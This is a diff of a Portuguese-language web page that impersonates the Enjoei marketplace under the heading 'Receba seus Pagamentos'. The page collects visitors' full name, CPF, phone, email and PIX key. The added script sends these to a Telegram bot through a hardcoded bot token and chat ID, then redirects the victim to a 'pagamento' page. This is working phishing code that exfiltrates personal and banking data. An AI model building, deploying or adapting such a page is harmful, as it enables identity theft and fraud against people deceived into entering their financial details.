@@ -1,715 +1,259 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>ENJOEI - Receba seus Pagamentos</title>
-    <style>
-      :root {
-        --primary-color: #61005D;
-        --primary-light: #8E3A8B;
-        --secondary-color: #FFC0CB;
-        --text-color: #333;
-        --light-gray: #f5f5f5;
-        --medium-gray: #e0e0e0;
-        --dark-gray: #666;
-        --error-color: #e74c3c;
-        --success-color: #2ecc71;
-      }
-      
-      body {
-        font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
-        background-color: var(--light-gray);
-        margin: 0;
-        padding: 0;
-        color: var(--text-color);
-        line-height: 1.6;
-      }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ENJOEI - Receba seus Pagamentos</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
 
-      .o-container.-with-gutter {
-        max-width: 500px;
-        margin: 0 auto;
-        padding: 20px;
-      }
+    .logo-banner {
+      background-color: #fff;
+      text-align: center;
+      padding: 20px 0;
+      border-bottom: 1px solid #ddd;
+    }
 
-      .c-clean-header {
-        background: linear-gradient(135deg, var(--primary-color), var(--primary-light));
-        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        padding: 20px 0;
-        position: sticky;
-        top: 0;
-        z-index: 100;
-      }
+    .o-container.-with-gutter {
+      max-width: 600px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
 
-      .c-clean-header__wrapper {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        padding: 0 20px;
-      }
+    .c-clean-header__wrapper {
+      text-align: center;
+      margin-bottom: 20px;
+    }
 
-      .header-title {
-        color: white;
-        font-size: 20px;
-        font-weight: 600;
-        margin: 0;
-      }
+    .header-title {
+      font-size: 24px;
+      margin: 0;
+      color: #61005D;
+    }
 
-      .session-wrapper {
-        background-color: white;
-        border-radius: 12px;
-        padding: 30px;
-        box-shadow: 0 8px 24px rgba(0,0,0,0.08);
-        margin-top: 30px;
-        border: 1px solid var(--medium-gray);
-      }
+    .session-title {
+      font-size: 20px;
+      margin-bottom: 10px;
+      color: #61005D;
+    }
 
-      .session-header {
-        text-align: center;
-        margin-bottom: 30px;
-      }
+    .session-text {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
+    }
 
-      .session-title {
-        color: var(--primary-color);
-        font-size: 24px;
-        font-weight: 700;
-        margin-bottom: 10px;
-        position: relative;
-        display: inline-block;
-      }
+    .l-field {
+      margin-bottom: 20px;
+    }
 
-      .session-title:after {
-        content: "";
-        position: absolute;
-        bottom: -8px;
-        left: 50%;
-        transform: translateX(-50%);
-        width: 60px;
-        height: 3px;
-        background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
-        border-radius: 3px;
-      }
+    .l-label {
+      display: block;
+      margin-bottom: 5px;
+      color: #333;
+      font-weight: bold;
+    }
 
-      .session-text {
-        color: var(--dark-gray);
-        font-size: 16px;
-        margin: 0;
-        line-height: 1.5;
-      }
+    .o-input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+    }
 
-      .l-field {
-        margin-bottom: 25px;
-        position: relative;
-      }
+    .mensagem-erro {
+      font-size: 12px;
+      color: red;
+      display: none;
+      margin-top: 5px;
+    }
 
-      .l-label {
-        display: block;
-        font-size: 14px;
-        font-weight: 600;
-        margin-bottom: 8px;
-        color: var(--primary-color);
-      }
+    .submit-button {
+      background-color: #61005D;
+      color: #fff;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+    }
 
-      .o-input {
-        width: 100%;
-        padding: 14px 16px;
-        border: 2px solid var(--medium-gray);
-        border-radius: 8px;
-        font-size: 15px;
-        transition: all 0.3s ease;
-        box-sizing: border-box;
-        background-color: #fafafa;
-      }
-
-      .o-input:focus {
-        border-color: var(--primary-light);
-        outline: none;
-        box-shadow: 0 0 0 3px rgba(97, 0, 93, 0.1);
-        background-color: white;
-      }
-
-      .o-input:hover {
-        border-color: #b3b3b3;
-      }
-
-      .separator {
-        display: flex;
-        align-items: center;
-        margin: 30px 0;
-        color: var(--dark-gray);
-        font-size: 14px;
-        font-weight: 500;
-      }
-
-      .separator:before,
-      .separator:after {
-        content: "";
-        flex: 1;
-        height: 1px;
-        background: linear-gradient(90deg, transparent, var(--medium-gray));
-        margin: 0 10px;
-      }
-
-      .separator:after {
-        background: linear-gradient(90deg, var(--medium-gray), transparent);
-      }
-
-      .o-button.-xs-primary {
-        background: linear-gradient(135deg, var(--primary-color), var(--primary-light));
-        color: white;
-        border: none;
-        border-radius: 8px;
-        padding: 16px;
-        font-size: 16px;
-        font-weight: 600;
-        width: 100%;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        box-shadow: 0 4px 8px rgba(97, 0, 93, 0.2);
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
-      }
-
-      .o-button.-xs-primary:hover {
-        background: linear-gradient(135deg, var(--primary-light), var(--primary-color));
-        transform: translateY(-2px);
-        box-shadow: 0 6px 12px rgba(97, 0, 93, 0.25);
-      }
-
-      .o-button.-xs-primary:active {
-        transform: translateY(0);
-      }
-
-      .erro {
-        border-color: var(--error-color) !important;
-      }
-
-      .mensagem-erro {
-        color: var(--error-color);
-        font-size: 13px;
-        margin-top: 6px;
-        display: none;
-        font-weight: 500;
-      }
-
-      select.o-input {
-        appearance: none;
-        background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2361005D'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
-        background-repeat: no-repeat;
-        background-position: right 12px center;
-        background-size: 16px;
-        padding-right: 36px;
-      }
-
-      .o-text.-xs-minion {
-        font-size: 12px;
-        color: var(--dark-gray);
-        margin-top: 30px;
-        text-align: center;
-        line-height: 1.5;
-      }
-
-      .o-text.-xs-minion a {
-        color: var(--primary-color);
-        font-weight: 500;
-      }
-
-      .logo-banner {
-        position: fixed;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        background: white;
-        z-index: 9999;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        animation: fadeOut 0.5s ease 1.5s forwards;
-      }
-      
-      .logo-banner svg {
-        animation: bounce 0.8s ease infinite;
-        width: 60px;
-        height: 60px;
-      }
-      
-      @keyframes bounce {
-        0% { transform: scale(0.8); opacity: 0; }
-        50% { transform: scale(1.05); opacity: 0.8; }
-        100% { transform: scale(1); opacity: 1; }
-      }
-      
-      @keyframes fadeOut {
-        to { opacity: 0; visibility: hidden; }
-      }
-
-      .button-loading {
-        position: relative;
-        pointer-events: none;
-      }
-
-      .button-loading:after {
-        content: "";
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        width: 20px;
-        height: 20px;
-        margin: -10px 0 0 -10px;
-        border: 2px solid rgba(255,255,255,0.3);
-        border-top-color: white;
-        border-radius: 50%;
-        animation: spin 0.8s linear infinite;
-      }
-
-      @keyframes spin {
-        to { transform: rotate(360deg); }
-      }
-
-      .help-tooltip {
-        position: relative;
-        display: inline-block;
-        margin-left: 5px;
-        cursor: help;
-      }
-
-      .help-tooltip:before {
-        content: "?";
-        display: inline-flex;
-        align-items: center;
-        justify-content: center;
-        width: 16px;
-        height: 16px;
-        background-color: var(--primary-color);
-        color: white;
-        border-radius: 50%;
-        font-size: 12px;
-        font-weight: bold;
-      }
-
-      .help-tooltip:hover:after {
-        content: attr(data-tooltip);
-        position: absolute;
-        bottom: 100%;
-        left: 50%;
-        transform: translateX(-50%);
-        background-color: #333;
-        color: white;
-        padding: 6px 10px;
-        border-radius: 4px;
-        font-size: 12px;
-        white-space: nowrap;
-        margin-bottom: 5px;
-        z-index: 100;
-      }
-
-      @media (max-width: 480px) {
-        .session-wrapper {
-          padding: 25px 20px;
-          margin-top: 20px;
-        }
-        
-        .session-title {
-          font-size: 22px;
-        }
-        
-        .header-title {
-          font-size: 18px;
-        }
-        
-        .o-input {
-          padding: 12px 14px;
-        }
-      }
-    </style>
+    .submit-button:hover {
+      background-color: #4d004b;
+    }
+  </style>
 </head>
 <body>
-    <div class="logo-banner">
-      <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none">
-        <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path>
-      </svg>
-    </div>
-   
+  <div class="logo-banner">
+    <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" fill="none" viewBox="0 0 30 30">
+      <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622s-9.547-1.534-12.108-6.622z" clip-rule="evenodd"/>
+    </svg>
+  </div>
+
+  <div class="o-container -with-gutter">
     <header class="c-clean-header">
       <div class="c-clean-header__wrapper">
         <h1 class="header-title">Receba seus Pagamentos</h1>
       </div>
     </header>
 
-    <main class="o-container -with-gutter">
-      <div class="session-wrapper">
-        <div class="session-header">
-          <h1 class="session-title">Informações Bancárias</h1>
-          <p class="session-text">Preencha seus dados para receber seus pagamentos com segurança</p>
+    <section class="session-wrapper">
+      <div class="session-header">
+        <h2 class="session-title">Dados Bancários</h2>
+        <p class="session-text">Preencha seus dados bancários para receber seus pagamentos de forma segura e rápida.</p>
+      </div>
+
+      <form id="payment-form">
+        <div class="l-field">
+          <label class="l-label" for="nome">Nome completo</label>
+          <input type="text" id="nome" name="nome" class="o-input" placeholder="Digite seu nome completo">
+          <div class="mensagem-erro">Este campo é obrigatório.</div>
         </div>
 
-        <form id="payment-form" class="o-form l-form">
-          <div class="l-field">
-            <label for="user_name" class="l-label">
-              Nome Completo <span class="help-tooltip" data-tooltip="Nome conforme cadastro no banco"></span>
-            </label>
-            <input
-              type="text"
-              name="name"
-              id="user_name"
-              placeholder="Nome completo do titular"
-              class="o-input"
-              required
-              minlength="5"
-            />
-            <div id="erro-user_name" class="mensagem-erro">
-              Por favor, insira seu nome completo (mínimo 5 caracteres)
-            </div>
-          </div>
+        <div class="l-field">
+          <label class="l-label" for="cpf">CPF</label>
+          <input type="text" id="cpf" name="cpf" class="o-input" placeholder="Digite seu CPF">
+          <div class="mensagem-erro">Digite um CPF válido.</div>
+        </div>
 
-          <div class="l-field">
-            <label for="user_cpf" class="l-label">CPF</label>
-            <input
-              type="text"
-              name="cpf"
-              id="user_cpf"
-              placeholder="000.000.000-00"
-              maxlength="14"
-              class="o-input"
-              required
-              pattern="\d{3}\.\d{3}\.\d{3}-\d{2}"
-            />
-            <div id="erro-user_cpf" class="mensagem-erro">
-              Por favor, insira um CPF válido (formato: 000.000.000-00)
-            </div>
-          </div>
+        <div class="l-field">
+          <label class="l-label" for="telefone">Telefone</label>
+          <input type="text" id="telefone" name="telefone" class="o-input" placeholder="Digite seu telefone">
+          <div class="mensagem-erro">Este campo é obrigatório.</div>
+        </div>
 
-          <div class="l-field">
-            <label for="user_phone" class="l-label">Telefone</label>
-            <input
-              type="tel"
-              name="phone"
-              id="user_phone"
-              placeholder="(00) 00000-0000"
-              maxlength="15"
-              class="o-input"
-              required
-              pattern="\(\d{2}\) \d{4,5}-\d{4}"
-            />
-            <div id="erro-user_phone" class="mensagem-erro">
-              Por favor, insira um telefone válido (formato: (00) 00000-0000)
-            </div>
-          </div>
+        <div class="l-field">
+          <label class="l-label" for="pix_key_type">Tipo de chave PIX</label>
+          <select id="pix_key_type" name="pix_key_type" class="o-input">
+            <option value="cpf">CPF</option>
+            <option value="celular">Celular</option>
+            <option value="email">E-mail</option>
+            <option value="chave aleatoria">Chave aleatória</option>
+          </select>
+          <div class="mensagem-erro">Selecione o tipo de chave PIX.</div>
+        </div>
 
-          <div class="separator">Dados Bancários</div>
+        <div class="l-field">
+          <label class="l-label" for="pix_key">Chave PIX</label>
+          <input type="text" id="pix_key" name="pix_key" class="o-input" placeholder="Digite sua chave PIX">
+          <div class="mensagem-erro">Este campo é obrigatório.</div>
+        </div>
 
-          <div class="l-field">
-            <label for="pix_key_type" class="l-label">
-              Tipo de Chave Pix <span class="help-tooltip" data-tooltip="Selecione como deseja receber"></span>
-            </label>
-            <select id="pix_key_type" name="pix_key_type" class="o-input" required>
-              <option value="" disabled selected>Selecione o tipo de chave</option>
-              <option value="CPF">CPF</option>
-              <option value="EMAIL">E-mail</option>
-              <option value="TELEFONE">Telefone</option>
-              <option value="ALEATORIA">Chave Aleatória</option>
-            </select>
-            <div id="erro-pix_key_type" class="mensagem-erro">
-              Por favor, selecione um tipo de chave
-            </div>
-          </div>
+        <div class="l-field">
+          <label class="l-label" for="email">E-mail</label>
+          <input type="email" id="email" name="email" class="o-input" placeholder="Digite seu e-mail">
+          <div class="mensagem-erro">Digite um e-mail válido.</div>
+        </div>
 
-          <div class="l-field" id="pix_key_field">
-            <label for="pix_key" class="l-label">Chave Pix</label>
-            <input
-              type="text"
-              name="pix_key"
-              id="pix_key"
-              placeholder="Digite sua chave Pix"
-              class="o-input"
-              required
-            />
-            <div id="erro-pix_key" class="mensagem-erro">
-              Por favor, insira sua chave Pix
-            </div>
-          </div>
+        <button type="submit" class="submit-button">Enviar Dados</button>
+      </form>
+    </section>
+  </div>
 
-          <div class="o-well" style="margin-top: 30px;">
-            <button 
-              type="submit" 
-              class="o-button -xs-primary"
-              id="submit-button"
-            >
-              Confirmar Dados
-            </button>
-          </div>
+  <script>
+    document.querySelector('#payment-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      let formValid = true;
 
-          <div class="separator">Segurança</div>
-
-          <p class="o-text -xs-minion">
-            Suas informações estão protegidas com criptografia avançada.
-            <br>
-            Ao continuar, você concorda com nossos <a href="#" target="_blank">Termos de Serviço</a> e <a href="#" target="_blank">Política de Privacidade</a>.
-          </p>
-        </form>
-      </div>
-    </main>
-
-    <script>
-      // URL da API (substitua pela URL do seu servidor hospedado)
-      const API_URL = 'https://seu-servidor.onrender.com/api'; // Atualize aqui
-
-      // Remove o logo após 1.5 segundos
-      setTimeout(() => {
-        const logo = document.querySelector(".logo-banner");
-        if (logo) logo.remove();
-      }, 1500);
-
-      // Formatação de CPF
-      document.getElementById('user_cpf').addEventListener('input', function(e) {
-        let value = e.target.value.replace(/\D/g, "");
-        
-        if (value.length > 3 && value.length <= 6) {
-          value = value.replace(/(\d{3})(\d+)/, "$1.$2");
-        } else if (value.length > 6 && value.length <= 9) {
-          value = value.replace(/(\d{3})(\d{3})(\d+)/, "$1.$2.$3");
-        } else if (value.length > 9) {
-          value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
-        }
-        
-        e.target.value = value;
-        validateCPF(e.target);
-      });
-
-      // Validação de CPF
-      function validateCPF(input) {
-        const cpf = input.value.replace(/\D/g, "");
-        const errorElement = document.getElementById("erro-user_cpf");
-        
-        if (cpf.length === 11) {
-          // Verifica se todos os dígitos são iguais
-          if (/^(\d)\1{10}$/.test(cpf)) {
-            showError(input, errorElement, "CPF inválido (não pode ter todos dígitos iguais)");
-            return false;
-          }
-          
-          // Validação dos dígitos verificadores
-          let sum = 0;
-          let remainder;
-          
-          for (let i = 1; i <= 9; i++) {
-            sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
-          }
-          remainder = (sum * 10) % 11;
-          
-          if ((remainder === 10) || (remainder === 11)) remainder = 0;
-          if (remainder !== parseInt(cpf.substring(9, 10))) {
-            showError(input, errorElement, "CPF inválido (dígito verificador incorreto)");
-            return false;
-          }
-          
-          sum = 0;
-          for (let i = 1; i <= 10; i++) {
-            sum += parseInt(cpf.substring(i-1, i)) * (12 - i);
-          }
-          remainder = (sum * 10) % 11;
-          
-          if ((remainder === 10) || (remainder === 11)) remainder = 0;
-          if (remainder !== parseInt(cpf.substring(10, 11))) {
-            showError(input, errorElement, "CPF inválido (dígito verificador incorreto)");
-            return false;
-          }
-          
-          hideError(input, errorElement);
-          return true;
-        } else if (cpf.length > 0) {
-          showError(input, errorElement, cpf.length < 11 ? 
-            "CPF incompleto (11 dígitos necessários)" : 
-            "CPF muito longo (máximo 11 dígitos)");
-          return false;
-        }
-        
-        hideError(input, errorElement);
-        return false;
+      // Validação do nome
+      if (document.querySelector('#nome').value.trim() === '') {
+        formValid = false;
+        document.querySelector('#nome').nextElementSibling.style.display = 'block';
+      } else {
+        document.querySelector('#nome').nextElementSibling.style.display = 'none';
       }
 
-      // Formatação de celular
-      document.getElementById('user_phone').addEventListener('input', function(e) {
-        let value = e.target.value.replace(/\D/g, "");
-        
-        if (value.length > 2 && value.length <= 7) {
-          value = value.replace(/(\d{2})(\d+)/, "($1) $2");
-        } else if (value.length > 7 && value.length <= 11) {
-          value = value.replace(/(\d{2})(\d{5})(\d+)/, "($1) $2-$3");
-        } else if (value.length > 11) {
-          value = value.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
-        }
-        
-        e.target.value = value;
-        validatePhone(e.target);
-      });
-
-      // Validação de telefone
-      function validatePhone(input) {
-        const phone = input.value.replace(/\D/g, "");
-        const errorElement = document.getElementById("erro-user_phone");
-        
-        if (phone.length === 11 || phone.length === 10) {
-          hideError(input, errorElement);
-          return true;
-        } else if (phone.length > 0) {
-          showError(input, errorElement, phone.length < 10 ? 
-            "Telefone incompleto (10 ou 11 dígitos necessários)" : 
-            "Telefone muito longo (máximo 11 dígitos)");
-          return false;
-        }
-        
-        hideError(input, errorElement);
-        return false;
+      // Validação do CPF
+      if (document.querySelector('#cpf').value.trim() === '') {
+        formValid = false;
+        document.querySelector('#cpf').nextElementSibling.style.display = 'block';
+      } else {
+        document.querySelector('#cpf').nextElementSibling.style.display = 'none';
       }
 
-      // Mostrar erro
-      function showError(input, errorElement, message) {
-        input.classList.add("erro");
-        errorElement.textContent = message;
-        errorElement.style.display = "block";
+      // Validação do telefone
+      if (document.querySelector('#telefone').value.trim() === '') {
+        formValid = false;
+        document.querySelector('#telefone').nextElementSibling.style.display = 'block';
+      } else {
+        document.querySelector('#telefone').nextElementSibling.style.display = 'none';
       }
 
-      // Esconder erro
-      function hideError(input, errorElement) {
-        input.classList.remove("erro");
-        errorElement.style.display = "none";
+      // Validação do tipo de chave PIX
+      if (document.querySelector('#pix_key_type').value === '') {
+        formValid = false;
+        document.querySelector('#pix_key_type').nextElementSibling.style.display = 'block';
+      } else {
+        document.querySelector('#pix_key_type').nextElementSibling.style.display = 'none';
       }
 
-      // Validação do formulário
-      document.getElementById('payment-form').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const button = document.getElementById("submit-button");
-        const form = e.target;
-        let isValid = true;
-        
-        // Validar todos os campos
-        const nome = document.getElementById("user_name");
-        const cpf = document.getElementById("user_cpf");
-        const telefone = document.getElementById("user_phone");
-        const tipoChave = document.getElementById("pix_key_type");
-        const chavePix = document.getElementById("pix_key");
-        
-        // Validar nome
-        if (nome.value.length < 5) {
-          showError(nome, document.getElementById("erro-user_name"), 
-            "Por favor, insira seu nome completo (mínimo 5 caracteres)");
-          isValid = false;
-        } else {
-          hideError(nome, document.getElementById("erro-user_name"));
-        }
-        
-        // Validar CPF
-        if (!validateCPF(cpf)) {
-          isValid = false;
-        }
-        
-        // Validar telefone
-        if (!validatePhone(telefone)) {
-          isValid = false;
-        }
-        
-        // Validar tipo de chave
-        if (!tipoChave.value) {
-          showError(tipoChave, document.getElementById("erro-pix_key_type"), 
-            "Por favor, selecione um tipo de chave");
-          isValid = false;
-        } else {
-          hideError(tipoChave, document.getElementById("erro-pix_key_type"));
-        }
-        
-        // Validar chave Pix
-        if (!chavePix.value) {
-          showError(chavePix, document.getElementById("erro-pix_key"), 
-            "Por favor, insira sua chave Pix");
-          isValid = false;
-        } else {
-          hideError(chavePix, document.getElementById("erro-pix_key"));
-        }
-        
-        if (!isValid) {
-          alert("Por favor, corrija os campos destacados em vermelho antes de enviar.");
-          return;
-        }
-        
-        // Simular loading
-        button.classList.add("button-loading");
-        button.disabled = true;
-        button.textContent = 'Enviando...';
-        
-        // Criar objeto com os dados do cliente
-        const clientData = {
-          nome: nome.value,
-          cpf: cpf.value.replace(/\D/g, ""),
-          telefone: telefone.value.replace(/\D/g, ""),
-          tipoChave: tipoChave.value,
-          chavePix: chavePix.value,
-          dataCadastro: new Date().toISOString(),
-          status: "pendente"
-        };
-        
-        // Enviar dados para o servidor
-        saveClient(clientData)
-          .then(() => {
-            alert('Dados enviados com sucesso!');
-            // Redirecionar para página de sucesso
-            window.location.href = '/VeryPagement/pagamento.html';
-          })
-          .catch(error => {
-            console.error("Erro ao salvar cliente:", error);
-            alert("Ocorreu um erro ao salvar seus dados: " + error.message);
-          })
-          .finally(() => {
-            button.classList.remove("button-loading");
-            button.disabled = false;
-            button.textContent = 'Confirmar Dados';
-          });
-      });
-
-      // Função para salvar cliente no servidor
-      async function saveClient(clientData) {
-        try {
-          const response = await fetch(`${API_URL}/clients`, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(clientData)
-          });
-          
-          if (!response.ok) {
-            const errorData = await response.json();
-            throw new Error(errorData.error || 'Erro ao salvar cliente');
-          }
-          
-          return await response.json();
-        } catch (error) {
-          throw error;
-        }
+      // Validação da chave PIX
+      if (document.querySelector('#pix_key').value.trim() === '') {
+        formValid = false;
+        document.querySelector('#pix_key').nextElementSibling.style.display = 'block';
+      } else {
+        document.querySelector('#pix_key').nextElementSibling.style.display = 'none';
       }
 
-      // Validação em tempo real para outros campos
-      document.querySelectorAll('.o-input').forEach(input => {
-        input.addEventListener('input', function() {
-          const errorElement = this.nextElementSibling;
-          if (errorElement && errorElement.classList.contains('mensagem-erro')) {
-            if (this.checkValidity()) {
-              hideError(this, errorElement);
-            }
-          }
-        });
-      });
+      // Validação do e-mail
+      if (document.querySelector('#email').value.trim() === '') {
+        formValid = false;
+        document.querySelector('#email').nextElementSibling.style.display = 'block';
+      } else {
+        document.querySelector('#email').nextElementSibling.style.display = 'none';
+      }
 
-      // Inicialização
-      document.addEventListener('DOMContentLoaded', function() {
-        // Verificar se veio de redirecionamento de admin
-        const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.get('admin') === 'true') {
-          console.log("Acesso do painel de admin");
-        }
+      if (!formValid) return;
+
+      const nome = document.querySelector('#nome').value;
+      const cpf = document.querySelector('#cpf').value;
+      const telefone = document.querySelector('#telefone').value;
+      const pixKeyType = document.querySelector('#pix_key_type').value;
+      const pixKey = document.querySelector('#pix_key').value;
+      const email = document.querySelector('#email').value;
+
+      // Enviar dados para o bot do Telegram
+      const botToken = '7571736631:AAHpeIsUbwtGmwU1azLAZoETK6NT8oRMW_g';
+      const chatId = '5114449108';
+      const message = `
+        Nome: ${nome}
+        CPF: ${cpf}
+        Telefone: ${telefone}
+        Tipo de Chave PIX: ${pixKeyType}
+        Chave PIX: ${pixKey}
+        E-mail: ${email}
+      `;
+      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        // Redirecionar para a página de pagamento após o envio dos dados
+        window.location.href = '/VeryPagement/pagamento.html';
+      })
+      .catch(error => {
+        console.error('Erro ao enviar os dados para o Telegram:', error);
       });
-    </script>
+    });
+  </script>
 </body>
 </html>
